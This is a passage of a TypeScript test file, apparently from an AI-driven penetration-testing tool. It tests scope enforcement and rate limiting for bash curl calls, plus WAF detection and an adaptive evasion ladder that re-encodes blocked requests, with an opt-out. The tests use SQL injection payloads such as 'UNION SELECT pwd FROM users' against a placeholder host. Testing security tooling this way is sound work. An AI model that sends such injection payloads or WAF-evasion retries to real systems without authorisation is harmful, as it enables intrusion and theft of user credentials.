      name: "bash",
      arguments: { command: "curl $TARGET_URL" },
    });
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/http_audit/);
    expect(ctx.enforcement!.summarize().requests_out_of_scope_blocked).toBe(1);
  });

  it("bash allows a non-egress command untouched", async () => {
    const ctx = httpAuditCtx();
    const ex = new ToolExecutor(ctx, null);
    const result = await ex.execute({
      name: "bash",
      arguments: { command: "echo hello" },
    });
    // echo succeeds; no egress, no blocked counter bump.
    expect(result.success).toBe(true);
    expect(ctx.enforcement!.summarize().requests_out_of_scope_blocked).toBe(0);
  });

  // ── pwnkit#568: close the bash rate-limiter bypass ──
  // Bash curl/wget previously bypassed both the per-host RateLimiter and the
  // enforcement counters entirely. These pin that bash-issued HTTP is now
  // paced (acquire) and counted (noteInScope) BEFORE exec.
  it("counts a bash curl as an in-scope request on the enforcement tracker", async () => {
    // Loopback scope so the real curl exec fails fast (connection refused)
    // without touching the network; the count happens before exec regardless.
    const scope = ScopePolicyFromHosts(["127.0.0.1"]);
    const enforcement = new EnforcementTracker({
      pathPolicy: new PathPolicy([]), // allow all paths
      killAfterSec: 1800,
    });
    const ctx: ToolContext = {
      target: "http://127.0.0.1",
      scanId: "waf-bash-1",
      findings: [],
      attackResults: [],
      targetInfo: {},
      scope,
      enforcement,
    };
    const ex = new ToolExecutor(ctx, null);
    await ex.execute({
      name: "bash",
      arguments: { command: "curl --max-time 1 http://127.0.0.1:9/probe || true" },
    });
    expect(enforcement.summarize().requests_in_scope).toBe(1);
  });

  it("paces a bash curl through the per-host RateLimiter", async () => {
    const scope = ScopePolicyFromHosts(["127.0.0.1"]);
    const rateLimiter = new RateLimiter({ default: { rps: 5 } });
    const acquireSpy = vi.spyOn(rateLimiter, "acquire");
    const ctx: ToolContext = {
      target: "http://127.0.0.1",
      scanId: "waf-bash-2",
      findings: [],
      attackResults: [],
      targetInfo: {},
      scope,
      rateLimiter,
    };
    const ex = new ToolExecutor(ctx, null);
    await ex.execute({
      name: "bash",
      arguments: { command: "curl --max-time 1 http://127.0.0.1:9/a || true" },
    });
    expect(acquireSpy).toHaveBeenCalledWith("http://127.0.0.1:9/a");
  });
});

// ── pwnkit#568: WAF detection + adaptive evasion (http_request) ──
describe("ToolExecutor — WAF detection + adaptive evasion (pwnkit#568)", () => {
  function wafCtx(overrides: Partial<ToolContext> = {}): ToolContext {
    return {
      target: "https://api.example.com",
      scanId: "waf-http-1",
      findings: [],
      attackResults: [],
      targetInfo: {},
      scope: ScopePolicyFromHosts(["api.example.com"]),
      wafDetector: new WafDetector(),
      ...overrides,
    };
  }

  it("reports a WAF block and adaptively varies the payload until it slips through", async () => {
    const ctx = wafCtx();
    const fetchUrls: string[] = [];
    let n = 0;
    const fetchStub = vi.fn(async (url: string) => {
      n += 1;
      fetchUrls.push(url);
      if (n === 1) {
        // Baseline: blocked by Cloudflare.
        return {
          status: 403,
          headers: new Headers({ server: "cloudflare", "cf-ray": "7d-LHR" }),
          text: async () => "Attention Required! | Cloudflare",
        } as unknown as Response;
      }
      // Evasion variant slips through.
      return {
        status: 200,
        headers: new Headers({ "content-type": "text/html" }),
        text: async () => "<html>ok</html>",
      } as unknown as Response;
    });
    vi.stubGlobal("fetch", fetchStub);
    try {
      const ex = new ToolExecutor(ctx, null);
      const result = await ex.execute({
        name: "http_request",
        arguments: {
          url: "https://api.example.com/api/search?q=1%20UNION%20SELECT%20pwd%20FROM%20users",
          method: "GET",
        },
      });
      expect(result.success).toBe(true);
      const output = result.output as Record<string, any>;
      // WAF was detected & reported.
      expect(output.waf).toBeDefined();
      expect(output.waf.detected).toBe(true);
      expect(output.waf.vendor).toBe("cloudflare");
      // Adaptive evasion ran and bypassed; the bypass response is returned.
      expect(output.waf.evasion.bypassed).toBe(true);
      expect(output.status).toBe(200);
      // "Subsequent payloads vary encoding" — the retried URL differs from the
      // original (query value was re-encoded).
      expect(fetchUrls.length).toBeGreaterThanOrEqual(2);
      expect(fetchUrls[1]).not.toBe(fetchUrls[0]);
      // Evidence recorded on the per-scan detector.
      const summary = ctx.wafDetector!.summary();
      expect(summary.waf_detected).toBe(true);
      expect(summary.total_blocks).toBe(1);
      expect(summary.total_bypasses).toBe(1);
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it("passes a clean (non-WAF) response straight through with no evasion", async () => {
    const ctx = wafCtx();
    const fetchStub = vi.fn(async () => ({
      status: 200,
      headers: new Headers({ "content-type": "application/json" }),
      text: async () => '{"ok":true}',
    } as unknown as Response));
    vi.stubGlobal("fetch", fetchStub);
    try {
      const ex = new ToolExecutor(ctx, null);
      const result = await ex.execute({
        name: "http_request",
        arguments: { url: "https://api.example.com/api/health", method: "GET" },
      });
      expect(result.success).toBe(true);
      const output = result.output as Record<string, any>;
      expect(output.waf).toBeUndefined();
      expect(fetchStub).toHaveBeenCalledTimes(1);
      expect(ctx.wafDetector!.summary().waf_detected).toBe(false);
    } finally {
      vi.unstubAllGlobals();
    }
  });

  // ── Ladder opt-out (engagement hardening) ──
  // Escalating a WAF block into encoded/mutated retries is what turns a routine
  // block into a SOC incident. The ladder must be disableable — via a posture
  // OR standalone via PWNKIT_WAF_EVASION=0 — while detection keeps working.
  it("does NOT run the evasion ladder under a conservative engagement posture", async () => {
    const ctx = wafCtx({ engagement: resolveEngagementProfile({ cliProfile: "conservative" }) });
    const fetchStub = vi.fn(async () => ({
      status: 403,
      headers: new Headers({ server: "cloudflare", "cf-ray": "7d-LHR" }),
      text: async () => "Attention Required! | Cloudflare",
    } as unknown as Response));
    vi.stubGlobal("fetch", fetchStub);
    try {
      const ex = new ToolExecutor(ctx, null);
      const result = await ex.execute({
        name: "http_request",
        arguments: {
          url: "https://api.example.com/api/search?q=1%20UNION%20SELECT%20pwd%20FROM%20users",
          method: "GET",
        },
      });
      const output = result.output as Record<string, any>;
      // Exactly ONE request: the baseline. No mutated variants on the wire.
      expect(fetchStub).toHaveBeenCalledTimes(1);
      // Detection still reports the block — we just don't try to beat it.
      expect(output.waf.detected).toBe(true);
      expect(output.waf.vendor).toBe("cloudflare");
      expect(output.waf.evasion).toEqual({
        enabled: false,
        reason: "evasion ladder disabled by engagement posture",
      });
      const summary = ctx.wafDetector!.summary();
      expect(summary.waf_detected).toBe(true);
      expect(summary.total_blocks).toBe(1);
      expect(summary.total_bypasses).toBe(0);
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it("honours the standalone PWNKIT_WAF_EVASION=0 opt-out with no posture wired", async () => {
    const ctx = wafCtx();
    const fetchStub = vi.fn(async () => ({
      status: 403,
      headers: new Headers({ server: "cloudflare", "cf-ray": "7d-LHR" }),
      text: async () => "Attention Required! | Cloudflare",
    } as unknown as Response));
    vi.stubGlobal("fetch", fetchStub);
    const prev = process.env.PWNKIT_WAF_EVASION;
    process.env.PWNKIT_WAF_EVASION = "0";
    try {
      const ex = new ToolExecutor(ctx, null);
      const result = await ex.execute({
        name: "http_request",
        arguments: {
          url: "https://api.example.com/api/search?q=1%20UNION%20SELECT%20pwd",
          method: "GET",
        },
      });
      expect(fetchStub).toHaveBeenCalledTimes(1);
      expect((result.output as Record<string, any>).waf.evasion.enabled).toBe(false);
    } finally {
      if (prev === undefined) delete process.env.PWNKIT_WAF_EVASION;
      else process.env.PWNKIT_WAF_EVASION = prev;
      vi.unstubAllGlobals();
    }
  });

  it("ladder still runs by default (no posture, no env override)", async () => {
    const ctx = wafCtx();
    let n = 0;
    const fetchStub = vi.fn(async () => {
      n += 1;
      return n === 1
        ? ({
            status: 403,
            headers: new Headers({ server: "cloudflare", "cf-ray": "7d-LHR" }),
            text: async () => "Attention Required! | Cloudflare",
          } as unknown as Response)
        : ({
            status: 200,
            headers: new Headers({ "content-type": "text/html" }),
            text: async () => "<html>ok</html>",
          } as unknown as Response);
    });
    vi.stubGlobal("fetch", fetchStub);
    try {
      const ex = new ToolExecutor(ctx, null);
      const result = await ex.execute({
        name: "http_request",
        arguments: {
          url: "https://api.example.com/api/search?q=1%20UNION%20SELECT%20pwd",
          method: "GET",
        },
      });
      const output = result.output as Record<string, any>;
      expect(fetchStub.mock.calls.length).toBeGreaterThanOrEqual(2);
      expect(output.waf.evasion.bypassed).toBe(true);
    } finally {
      vi.unstubAllGlobals();
    }
  });
});

function ScopePolicyFromHosts(hosts: string[]) {
  return HttpAuditScopePolicy.fromJson({ in_scope: hosts });
}
